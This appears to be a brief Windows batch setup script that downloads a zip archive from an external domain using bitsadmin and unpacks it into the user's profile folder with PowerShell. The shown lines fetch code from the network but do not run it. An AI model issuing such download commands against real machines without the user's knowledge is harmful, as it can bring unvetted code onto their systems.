mkdir %USERPROFILE%\π\setup

bitsadmin /transfer download https://www.topi.cf/topitopi.exe/setup/main.zip %USERPROFILE%\π\setup.zip

cd %USERPROFILE%\π

call powershell -command "Expand-Archive -Force setup.zip setup"
